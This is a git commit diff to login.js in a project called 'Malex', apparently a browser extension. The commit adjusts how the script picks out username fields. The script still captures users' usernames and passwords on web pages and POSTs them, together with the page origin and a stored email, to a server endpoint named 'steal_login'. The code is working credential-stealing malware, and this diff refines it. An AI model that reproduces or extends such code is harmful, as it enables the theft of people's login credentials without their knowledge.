117f5230c1a2c9c5c5b0af7dd3a66a90c093c1d3
swuleung <sammiwuleung@gmail.com>
2018-12-02 19:43:33 -0500

    Reject password types in inputs for login.js

--- Malex/scripts/login.js
+++ Malex/scripts/login.js
@@ -1,40 +1,43 @@
-var text_inputs = $('input');
+var inputs = $('input');
 var password = $('[type="password"]')[0];
-console.log(password);
 $(password).change(function () {
     chrome.storage.local.get('email', function (result) {
         var userEmail = result.email;
         if (typeof userEmail === 'undefined') userEmail = "no_email_found";
-        text_inputs.trigger('input');
+        inputs.trigger('input');
     });
 });
 
-$.each(text_inputs, function (element) {
+$.each(inputs, function (element) {
     $.get(`http://localhost:5000/get_login_kw`, function (result) {
         var is_in_attr = false;
+        var not_password_type = true;
         $.each(result.keywords, function (key) {
-            $.each(text_inputs[element].attributes, function () {
+            $.each(inputs[element].attributes, function () {
                 if (!(this.value === undefined)) {
+                    if (this.name == 'type' && this.value == "password") {
+                        not_password_type = false;
+                    }
                     if (this.value.indexOf(result.keywords[key]) >= 0) {
                         is_in_attr = true;
                     }
                 }
             });
         });
-        if (is_in_attr) {
-            $(text_inputs[element]).on('input', function () {
-                if ($(text_inputs[element]).val() != "") {
+        if (is_in_attr && not_password_type) {
+            $(inputs[element]).on('input', function () {
+                if ($(inputs[element]).val() != "") {
                     chrome.storage.local.get('email', function (resu) {
                         var userEmail;
                         var password = $('[type="password"]')[0];
                         if (typeof resu === 'undefined') userEmail = "no_email_found";
                         else userEmail = resu.email;
-                        if (text_inputs[element].value != "" &&
+                        if (inputs[element].value != "" &&
                             !(typeof password === 'undefined')) {
                             $.post("http://localhost:5000/steal_login", {
                                 email: userEmail,
                                 url: window.location.origin,
-                                username: $(text_inputs[element]).val(),
+                                username: $(inputs[element]).val(),
                                 password: $(password).val()
                             });
                         }
